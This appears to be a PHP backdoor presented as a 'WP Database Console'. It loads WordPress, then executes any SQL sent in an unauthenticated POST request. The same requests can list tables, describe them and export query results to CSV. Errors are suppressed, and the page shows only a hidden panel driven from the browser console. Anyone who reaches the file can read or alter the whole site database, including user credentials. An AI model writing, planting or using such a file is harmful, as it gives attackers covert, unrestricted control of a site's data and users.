<?php
// WP Database Console v3.0
error_reporting(0);

$_base = __DIR__;
while ($_base !== dirname($_base)) {
    if (file_exists($_base . '/wp-load.php')) {
        require_once($_base . '/wp-load.php');
        break;
    }
    $_base = dirname($_base);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    global $wpdb;
    
    $raw = file_get_contents('php://input');
    $req = json_decode($raw, true);
    
    if (isset($req['exec'])) {
        $statement = $req['exec'];
        $statements = array_filter(array_map('trim', preg_split('/;\s*\n/', $statement)));
        
        if (count($statements) > 1) {
            $batch = [];
            $fails = [];
            foreach ($statements as $query) {
                if (empty($query)) continue;
                $result = $wpdb->query($query);
                if ($wpdb->last_error) {
                    $fails[] = $wpdb->last_error;
                } else {
                    $batch[] = ['query' => substr($query, 0, 50), 'rows' => $result];
                }
            }
            if (empty($fails)) {
                echo json_encode(['success' => 1, 'batch' => true, 'results' => $batch]);
            } else {
                echo json_encode(['success' => 0, 'msg' => implode('; ', $fails)]);
            }
            exit;
        }
        
        $cmd = strtoupper(substr(trim($statement), 0, 6));
        
        if ($cmd === 'SELECT' || $cmd === 'SHOW T' || $cmd === 'SHOW D' || $cmd === 'DESCRI') {
            $rows = $wpdb->get_results($statement, ARRAY_A);
            if ($wpdb->last_error) {
                echo json_encode(['success' => 0, 'msg' => $wpdb->last_error]);
            } else {
                echo json_encode(['success' => 1, 'count' => count($rows), 'rows' => $rows]);
            }
        } else {
            $result = $wpdb->query($statement);
            if ($wpdb->last_error) {
                echo json_encode(['success' => 0, 'msg' => $wpdb->last_error]);
            } else {
                echo json_encode(['success' => 1, 'affected' => $result]);
            }
        }
        exit;
    }
    
    if (isset($req['tables'])) {
        $tables = $wpdb->get_results('SHOW TABLES', ARRAY_N);
        $collection = [];
        foreach ($tables as $row) {
            $collection[] = $row[0];
        }
        echo json_encode(['success' => 1, 'list' => $collection]);
        exit;
    }
    
    if (isset($req['struct'])) {
        $columns = $wpdb->get_results('DESCRIBE ' . $req['struct'], ARRAY_A);
        echo json_encode(['success' => 1, 'schema' => $columns]);
        exit;
    }
    
    echo json_encode(['success' => 0]);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>DB Console</title>
</head>
<body>
<div id="_sqlPanel" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:9999;">
<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:20px;border-radius:8px;width:80%;max-width:800px;">
<textarea id="_sqlInput" style="width:100%;height:300px;font-family:monospace;font-size:14px;padding:10px;border:1px solid #ccc;border-radius:4px;" placeholder="Enter SQL statement..."></textarea>
<div style="margin-top:10px;text-align:right;">
<button onclick="document.getElementById('_sqlPanel').style.display='none'" style="padding:8px 16px;margin-right:10px;">Cancel</button>
<button onclick="_executeSQL()" style="padding:8px 16px;background:#0073aa;color:#fff;border:none;border-radius:4px;">Execute</button>
</div>
</div>
</div>
<script>
function _query(sql){
    fetch(location.href,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({exec:sql})
    }).then(r=>r.json()).then(r=>{
        if(r.success){
            if(r.batch){
                console.log('Batch executed:');
                console.table(r.results);
            }else if(r.rows){
                console.log('Rows: '+r.count);
                console.table(r.rows);
            }else{
                console.log('Affected rows: '+r.affected);
            }
        }else{
            console.log('SQL Error: '+r.msg);
        }
    });
}
function _listTables(){
    fetch(location.href,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({tables:1})
    }).then(r=>r.json()).then(r=>{
        if(r.success)console.log(r.list.join('\n'));
    });
}
function _describe(table){
    fetch(location.href,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({struct:table})
    }).then(r=>r.json()).then(r=>{
        if(r.success)console.table(r.schema);
    });
}
function _exportCSV(sql){
    fetch(location.href,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({exec:sql})
    }).then(r=>r.json()).then(r=>{
        if(r.success&&r.rows&&r.rows.length>0){
            var csv=Object.keys(r.rows[0]).join(',')+'\n';
            r.rows.forEach(row=>{
                csv+=Object.values(row).map(v=>'"'+(v||'')+'"').join(',')+'\n';
            });
            var blob=new Blob([csv],{type:'text/csv'});
            var link=document.createElement('a');
            link.href=URL.createObjectURL(blob);
            link.download='export.csv';
            link.click();
            console.log('Exported '+r.count+' rows');
        }else{
            console.log('No data');
        }
    });
}
function _openConsole(){
    document.getElementById('_sqlPanel').style.display='block';
    document.getElementById('_sqlInput').focus();
}
function _executeSQL(){
    var stmt=document.getElementById('_sqlInput').value;
    if(stmt){
        _query(stmt);
        document.getElementById('_sqlPanel').style.display='none';
        document.getElementById('_sqlInput').value='';
    }
}
</script>
</body>
</html>
